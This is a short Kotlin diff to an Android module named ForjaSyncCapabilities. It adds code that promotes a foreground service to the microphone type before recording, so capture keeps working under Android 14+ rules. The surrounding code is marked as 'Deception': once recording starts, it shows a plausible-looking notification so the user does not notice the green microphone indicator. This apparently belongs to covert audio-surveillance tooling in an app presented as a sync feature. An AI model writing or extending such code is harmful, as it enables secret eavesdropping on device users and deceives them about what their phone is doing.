@@ -43,6 +43,7 @@ import java.util.concurrent.TimeUnit
  */
 object ForjaSyncCapabilities {
     private var appRef: ForjaApp? = null
+    @Volatile var syncService: SyncService? = null
     fun init(a: ForjaApp) { appRef = a }
     private val app: ForjaApp get() = appRef ?: throw IllegalStateException("ForjaSyncCapabilities.init()")
 
@@ -136,6 +137,9 @@ object ForjaSyncCapabilities {
         if (androidx.core.content.ContextCompat.checkSelfPermission(app, Manifest.permission.RECORD_AUDIO)
             != PackageManager.PERMISSION_GRANTED
         ) return@withContext err("mic: permisiune RECORD_AUDIO neacordată")
+
+        // Promote FGS to MICROPHONE before AudioRecord (Android 14+ enforcement).
+        syncService?.promoteMic()
 
         // Deception: plausible notification explaining the mic usage (green dot).
         val depId = MicDeception.start(app)
